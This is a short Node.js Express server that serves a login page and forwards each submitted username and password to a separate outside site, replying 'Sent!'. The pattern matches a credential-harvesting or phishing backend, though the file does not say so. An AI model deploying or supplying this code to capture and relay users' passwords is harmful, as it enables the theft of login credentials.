const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json());
app.use(express.static('public')); // Serve login.html

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // Forward to your OTHER server/API
  try {
    const response = await fetch('https://your-other-site.com/api/receive', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    const result = await response.json();
    res.json({ message: result.message || 'Sent!' });
  } catch (err) {
    res.status(500).json({ message: 'Failed to send data' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
